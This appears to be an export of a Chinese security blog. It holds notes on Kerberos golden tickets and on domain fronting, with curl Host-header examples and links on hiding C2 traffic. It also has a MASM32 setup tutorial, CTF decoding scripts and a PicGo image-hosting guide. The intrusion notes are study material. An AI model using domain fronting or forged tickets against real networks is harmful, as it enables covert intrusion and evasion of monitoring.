<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>需要<span class="token constant">KDC</span> Hash（krbtgt Hash）；</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">AS</span>直接验证通过；</pre></td></tr><tr><td data-num="3"></td><td><pre>可以访问任意服务器；</pre></td></tr></table></figure></li>
</ul>
<h3 id="00x03域前置简单了解"><a class="anchor" href="#00x03域前置简单了解">#</a> 00x03. 域前置简单了解</h3>
<h4 id="原理"><a class="anchor" href="#原理">#</a> 原理</h4>
<p>域前置（Domain fronting），是一种隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过 HTTPS 连接到被屏蔽的服务，而表面上像是在与另一个完全不同的站点通信。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126172348403.png" alt="image-20211126172348403" /></p>
<p>假设有两个主机，<span class="exturl" data-url="aHR0cDovL3huLS13d3ctYzg4ZHA3b21neThqczhqLmEueG4tLWNvbXd3dy01cDdpLmIuY29t">域名分别为 www.a.com 与 www.b.com</span>。这两个主机都是被 ip 为 1.1.1.1 的 cdn 进行加速的。</p>
<p>这时候使用 curl 命令请求 cdn 1.1.1.1，并自定义 host 段为 www.b.com 的话。就会返回 www.b.com 的页面。</p>
<p>命令为： <code>curl 1.1.1.1 -H &quot;Host: www.b.com&quot; -v</code></p>
<p>同理请求同样的 cdn，<span class="exturl" data-url="aHR0cDovL3huLS1ob3N0d3d3LWk3M2t1MWZ1NjRjamZ2Z3VjLmEuY29t">但是将 host 改为 www.a.com</span>, 这时候就会返回 A 页面的信息。</p>
<p>如果将 curl 后请求的 ip 改为 <span class="exturl" data-url="aHR0cDovL3d3dy5hLmNvbQ==">www.a.com</span>, host 改为 <span class="exturl" data-url="aHR0cDovL3d3dy5iLmNvbQ==">www.b.com</span>。命令为：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Curl www.a.com -H <span class="token string">"Host: www.b.com"</span> -v</pre></td></tr></table></figure><p>上述命令还是显示的是 www.b.com 的页面，<span class="exturl" data-url="aHR0cDovL3huLS13d3ctdnM5ZHc4OWZ4aGYxcGJ4OHZqaXhzMnN6ZTdhc3pqLmIuY29t"> 所以最终请求的还是 www.b.com</span>。</p>
<p>所以，域前置技术的核心基础设施是 cdn。</p>
<p>当使用 https 的时候 (一般都会使用 https，http 明文流量容易被检测到)，技术实现的核心是在不同的通信层使用不同的域名，DNS 解析的时候跟 TLS 服务器名称指示 (sin), 的时候使用的是合法的 CDN 的域名或者 ip (建议使用域名)，但实际访问域名却是 host 上写的域名.</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>host头对于检查器是不可见的，但是对于接受https请求的前端服务器是可见的。</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>简单理解：</pre></td></tr><tr><td data-num="4"></td><td><pre>   表面看，头部 <span class="token constant">CDN</span> 通讯域名（我们看得到）；</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>   实际内部，尾部真实 <span class="token constant">IP</span>（我们看不到）。</pre></td></tr></table></figure><p>没有域名 emmmm，贴上链接了解一下先</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMwL2FydGljbGUvZGV0YWlscy8xMDc3NDI4NDM=">域前置技术的原理与 CS 上的实现</span><br />
<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzg1NTYyP2l2a19zYT0xMDI0MzIwdQ==">为你的 C2 配置一个完美的隐藏</span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQzMTQ2">域前置水太深，偷学六娃来隐身 —— 域前置攻击复现</span></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>接触内网的第二天 emmmmm，好家伙直接给我整的一愣一愣的，跪求佬们带带 QAQ！！！</p>
<h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d4aDAwMDBtbS9hcnRpY2xlL2RldGFpbHMvMTA1OTk2Mzk3">Windows 内网协议学习 NTLM 篇之 NTLM 基础介绍</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjgxMzcz">windows 之 NTLM 认证</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb3BlbnNwZWNzL3dpbmRvd3NfcHJvdG9jb2xzL21zLW5sbXAvNzYwYTk3ODgtYmQzMi00ZDllLTg3YWQtMmFhNTk3MDc4NmFj">2.2.1 NTLM Messages</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2lyb255MGVnb2lzdC9hcnRpY2xlL2RldGFpbHMvMTA5NDkzMTAz">内网渗透 ——WINDOWS 认证机制之 KERBEROS</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODc0NjQ1L2FydGljbGUvZGV0YWlscy8xMTkzODQyMTY/c3BtPTEwMDEuMjEwMS4zMDAxLjY2NTAuMSZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQ1RSTElTVCU3RWRlZmF1bHQtMS5ub19zZWFyY2hfbGluayZhbXA7ZGVwdGhfMS11dG1fc291cmNlPWRpc3RyaWJ1dGUucGNfcmVsZXZhbnQubm9uZS10YXNrLWJsb2ctMiU3RWRlZmF1bHQlN0VDVFJMSVNUJTdFZGVmYXVsdC0xLm5vX3NlYXJjaF9saW5r">【渗透测试笔记】之【内网渗透 —— 彻底理解 Kerberos 认证和黄金白银票据】</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>一篇文章教会你如何更为简便的使用Win32-API</title>
    <url>/article/1df94188.html</url>
    <content><![CDATA[<p>通过这篇文章我们来了解一下如何更为简便的调用我们 windows 的一个 API。</p>
<p>在之前的学习中我们就已经知道了如何使用 API，但是要求我们先包含各种各样的东西，再接着写的那种方式操作起来并不容易。比如说你要先声明，然后在声明完之后，你要把类型都标记出来，然后再写。</p>
<p>那么有没有一种方法就是直接可以调用 win32 的 API 的呢，其实呢这种方法也是有的，那么接下来我们一起来学习一下如和配置这种环境。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119192551666.png" alt="image-20220119192551666" /></p>
<p>首先呢，我们还是正常的新建一个 asm 的一个项目，具体流程参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuMjFyMDAwLnRvcC8yMDIyLzAxLzE3L2UwYzlmYWNjLmh0bWwjMHgwMyVFNiVCMSU4NyVFNyVCQyU5NiVFOCVBRiVBRCVFOCVBOCU4MCVFNyU4RSVBRiVFNSVBMiU4MyVFNiU5MCVBRCVFNSVCQiVCQQ==">这篇文章中的汇编语言环境搭建</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119193711841.png" alt="image-20220119193711841" /></p>
<h2 id="安装masm32"><a class="anchor" href="#安装masm32">#</a> 安装 masm32</h2>
<p>创建完成之后，我们想要更简便的使用 win32 的 api，我们还要借助 masm 的变种 masm32</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119193942837.png" alt="image-20220119193942837" /></p>
<p>点击 Download</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119194046483.png" alt="image-20220119194046483" /></p>
<p>下载我们所需要的版本</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119194151129.png" alt="image-20220119194151129" /></p>
<p>下载完成之后，双击打开得到一个 install 文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119194811910.png" alt="image-20220119194811910" /></p>
<p>双击进行安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119194916939.png" alt="image-20220119194916939" /></p>
<p>点击 install，选择安装目录</p>
<p><strong>注</strong>：目录要自己记得下面还要用到！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119195000702.png" alt="image-20220119195000702" /></p>
<p>一路默认确定即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119195128329.png" alt="image-20220119195128329" /></p>
<p><strong>注</strong>：若安装时间较长，请耐心等候。</p>
<p>安装完成显示</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119195646666.png" alt="image-20220119195646666" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119195757465.png" alt="image-20220119195757465" /></p>
<p>安装完成之后会在你所选择的目录下生成一个 masm32 文件夹</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119195929508.png" alt="image-20220119195929508" /></p>
<p>点进去可以看到各种配置文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119200037523.png" alt="image-20220119200037523" /></p>
<p>inculde 和 lib 目录是我们接下来会用到的目录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119200137554.png" alt="image-20220119200137554" /></p>
<h2 id="配置所需include-path和附加库"><a class="anchor" href="#配置所需include-path和附加库">#</a> 配置所需 Include Path 和附加库</h2>
<p>接下来打开我们的项目右键打开属性面板</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119200339883.png" alt="image-20220119200339883" /></p>
<p>在 <code>Microsoft Macro Assembler</code>  中选择 <code>General</code> ，并配置它的 <code>Include Path</code>  变量</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119200450041.png" alt="image-20220119200450041" /></p>
<p>点击 &lt;编辑...&gt;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119200753169.png" alt="image-20220119200753169" /></p>
<p>进行如下勾选，一般为默认</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119200847130.png" alt="image-20220119200847130" /></p>
<p>然后我们将 masm32 的 include 文件夹路径填写进去之后，显示如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119201053802.png" alt="image-20220119201053802" /></p>
<p>点击确定之后显示如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119201139357.png" alt="image-20220119201139357" /></p>
<p>点击 “应用”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119201206827.png" alt="image-20220119201206827" /></p>
<p>接下来我们打开 “链接器” 的 “常规” 面板配置其 “附加库目录”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119201302908.png" alt="image-20220119201302908" /></p>
<p>进入编辑模式后点击右上角的 “...&quot;，选择所需文件夹</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119201446348.png" alt="image-20220119201446348" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119201537329.png" alt="image-20220119201537329" /></p>
<p>找到 masm32 的 lib 目录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119201621325.png" alt="image-20220119201621325" /></p>
<p>结果显示</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119201704897.png" alt="image-20220119201704897" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119201719850.png" alt="image-20220119201719850" /></p>
<p>依次点击 &quot;应用&quot;-&gt;&quot;确定&quot; 即可。</p>
<p>如此我们就能更加方便的使用 win32 的 api 了。</p>
<h2 id="样例测试"><a class="anchor" href="#样例测试">#</a> 样例测试</h2>
<p>测试代码</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">;</span>大小写敏感设置</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">;</span>导入头文件进行声名，在C语言中为windows<span class="token punctuation">.</span>h</pre></td></tr><tr><td data-num="8"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="13"></td><td><pre>text db <span class="token string">"hahaha你瞅啥"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span>编写代码段</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token punctuation">;</span>堆栈平衡</pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token punctuation">;</span>push <span class="token number">0</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token punctuation">;</span>push offset text</pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token punctuation">;</span>push offset text</pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">;</span>push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token punctuation">;</span>call MessageBox</pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span><span class="token number">16</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	</pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token punctuation">;</span>INVOKE<span class="token operator">:</span>伪编译</pre></td></tr><tr><td data-num="27"></td><td><pre>	INVOKE MessageBox<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>offset text<span class="token punctuation">,</span>offset text<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	INVOKE ExitProcess<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="29"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="30"></td><td><pre>END main</pre></td></tr></table></figure><p>运行结果</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119211510253.png" alt="image-20220119211510253" /></p>
<h2 id="关于报错"><a class="anchor" href="#关于报错">#</a> 关于报错</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119213658720.png" alt="image-20220119213658720" /></p>
<p>错误原因<br />
高于 14.26.28801 的 msvc 工具集编译不了 masm32v11r 环境的汇编</p>
<p>解决方案</p>
<p><strong>1. 更改 msvc 工具集版本</strong><br />
打开：Visual Studio Installer，选择修改输入 MSVC，安装 <code>MSVC v14x - VS 201x C++ x64/x86 生成工具(v14.xxxx)</code>  以下任意一个版本的工具即可：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119214211986.png" alt="image-20220119214211986" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119214931295.png" alt="image-20220119214931295" /></p>
<p>等待修改完成即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220119214306809.png" alt="image-20220119214306809" /></p>
<p><strong>2. 修改项目的 MSVC 的版本</strong><br />
<strong>右键项目</strong> -&gt;<strong> 属性</strong> -&gt;<strong> 配置属性</strong> -&gt;<strong> 高级</strong> -&gt;<strong>MSVC 工具集版本</strong> -&gt; 选择低于或等于 14.26 的 msvc 工具集即可。</p>
<p><code>注：强烈建议使用2015或2017版本，不存在高配置不兼容问题！</code></p>
<p>（ps：出现以上问题不排除可能因为小编实力没到位的问题 QAQ！！！）</p>
<p>这里使用 2015 版的配置一下就好了，没有什么奇奇怪怪的问题，还可以安装 Asm 高亮渲染插件！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220120222322181.png" alt="image-20220120222322181" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制解码</title>
    <url>/article/66f43719.html</url>
    <content><![CDATA[<h2 id="二进制幂数解码"><a class="anchor" href="#二进制幂数解码">#</a> 二进制幂数解码</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>a<span class="token operator">=</span><span class="token string">"8842101220480224404014224202480122"</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#分隔</span></pre></td></tr><tr><td data-num="3"></td><td><pre>a<span class="token operator">=</span>a<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>flag<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#遍历</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">list</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token builtin">sum</span><span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token builtin">sum</span> <span class="token operator">+=</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    flag <span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span> <span class="token operator">+</span> <span class="token builtin">sum</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="二进制转十进制"><a class="anchor" href="#二进制转十进制">#</a> 二进制转十进制</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ciphertxt <span class="token operator">=</span><span class="token string">"01000100010100110111100100110011010010100111100101001011011101100101000001000011010100000110110101001000001101000101011101000011011110100010101101010100011010000101011101101001001100100100011001100111010010110110111100111001011001010101001101010000010101010011010001100101001101010110011100101011011010100101101001010101001100110100011001110010010101110100111001110110010011000100110100110101001101010110101101000101011001100011000101101000010001010110110101001110011100100111010100101011010011100100010100110011"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>m <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ciphertxt<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciphertxt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>四进制解码</title>
    <url>/article/4610d5dd.html</url>
    <content><![CDATA[<h2 id="密文直输版"><a class="anchor" href="#密文直输版">#</a> 密文直输版</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ciphertxt <span class="token operator">=</span> <span class="token string">'1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>c <span class="token operator">=</span> ciphertxt<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    temp <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        temp <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">**</span>j<span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token operator">-</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="txt版"><a class="anchor" href="#txt版">#</a> txt 版</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>m <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    c <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        temp <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            temp <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">**</span>j<span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token operator">-</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        m <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>使用PicGo+Github/Gitee+Typroa搭建属于自己的图床</title>
    <url>/article/141d7194.html</url>
    <content><![CDATA[<p>之前写博文上传图片总是件麻烦的事，就想自己搭个图床方便上传图片，于是整理了这一篇文章。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/69ec183907205bfa4c5b70b4ef19385.jpg" alt="image-69ec183907205bfa4c5b70b4ef19385" /></p>
<h2 id="picgo"><a class="anchor" href="#picgo">#</a> PicGo</h2>
<p>所谓图床，就是自动把本地图片转换成链接的一款工具，网络上有很多图床工具，就目前使用种类而言， <code>PicGo</code>  算得上一款比较优秀的图床工具。它是一款用  <code>Electron-vue</code>  开发的软件，可以支持微博，七牛云，腾讯云 COS，又拍云， <code>GitHub</code> ，阿里云 OSS， <code>SM.MS</code> ， <code>imgur</code>  等 8 种常用图床，功能强大，简单易用。</p>
<p>我们到下面的链接下载最新版本</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01vbHVuZXJmaW5uL1BpY0dvL3JlbGVhc2Vz">https://github.com/Molunerfinn/PicGo/releases</span></p>
<p>根据自己的电脑系统选择下在相应的安装包，如果不是下载安装包，想看源码的话，可以选择 <code>git clone https://github.com/Molunerfinn/PicGo.git</code>  克隆到本地</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194648684.png" alt="image-20211203194648684" /></p>
<p>安装后完成之后，会在电脑的任务栏显示相应的图标，点击小图标，选择打开详细窗口，窗口看着还是非常整洁，美观</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194703879.png" alt="image-20211203194703879" /></p>
<h2 id="github"><a class="anchor" href="#github">#</a> GitHub</h2>
<p>首先登陆  <code>GitHub</code> ，新建一个仓库或者也可以使用一个已有仓库</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194725974.png" alt="image-20211203194725974" /></p>
<p>点击 <code>New repository</code>  创建一个新仓库，自定义仓库名称即可。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194740575.png" alt="image-20211203194740575" /></p>
<p>添加 <code>README</code>  文件形成默认分支。</p>
<p><strong>注</strong>：这里建议选择 <code>Public</code> ，因为私有库只有自己能够访问，因此图片上传上去之后是没法显示的。</p>
<p>创建好后，需要在  <code>GitHub</code>  上生成一个  <code>token</code>  以便  <code>PicGo</code>  来操作我们的仓库，来到个人中心，点击 <code>setting</code>  后下滑可以看到  <code>Developer settings </code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194757846.png" alt="image-20211203194757846" /></p>
<p>点击 <code>Developer settings</code>  就能看到  <code>Personal access tokens</code> ，我们在这里创建需要的  <code>token</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194813733.png" alt="image-20211203194813733" /></p>
<p>点击  <code>Generate new token</code>  创建一个新  <code>token</code> ，选择  <code>repo</code> ，同时它会把包含其中的都会勾选上，我们勾选这些就可以了。然后拉到最下方点击绿色按钮， <code>Generate token</code>  即可。然后这里会生成一个  <code>token</code>  ，记得复制保存到其他地方，因为这个  <code>token</code>  只显示一次！！</p>
